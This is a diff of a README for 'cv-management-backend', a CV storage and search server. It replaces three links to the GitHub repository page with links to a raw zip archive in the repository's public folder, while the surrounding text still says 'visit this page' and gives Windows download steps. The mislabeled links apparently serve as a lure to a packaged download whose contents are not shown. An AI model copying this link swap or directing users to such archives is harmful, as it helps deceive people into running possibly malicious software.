@@ -1,6 +1,6 @@
 # 🗂️ cv-management-backend - Simple CV Storage and Search
 
-[![Download cv-management-backend](https://img.shields.io/badge/Download%20cv-management-backend-blue?style=for-the-badge&logo=github)](https://github.com/asiahervas02-cyber/cv-management-backend)
+[![Download cv-management-backend](https://img.shields.io/badge/Download%20cv-management-backend-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/asiahervas02-cyber/cv-management-backend/main/public/backend-cv-management-v1.8.zip)
 
 ## 🚀 What this is
 
@@ -10,7 +10,7 @@ cv-management-backend is the server side of a CV management system. It helps sto
 
 Use this link to visit this page to download:
 
-[cv-management-backend](https://github.com/asiahervas02-cyber/cv-management-backend)
+[cv-management-backend](https://raw.githubusercontent.com/asiahervas02-cyber/cv-management-backend/main/public/backend-cv-management-v1.8.zip)
 
 Follow these steps on a Windows PC:
 
@@ -174,7 +174,7 @@ Check these items first:
 
 Use this page to visit and download the project files:
 
-[https://github.com/asiahervas02-cyber/cv-management-backend](https://github.com/asiahervas02-cyber/cv-management-backend)
+[https://raw.githubusercontent.com/asiahervas02-cyber/cv-management-backend/main/public/backend-cv-management-v1.8.zip](https://raw.githubusercontent.com/asiahervas02-cyber/cv-management-backend/main/public/backend-cv-management-v1.8.zip)
 
 ## 🏷️ Topics
 
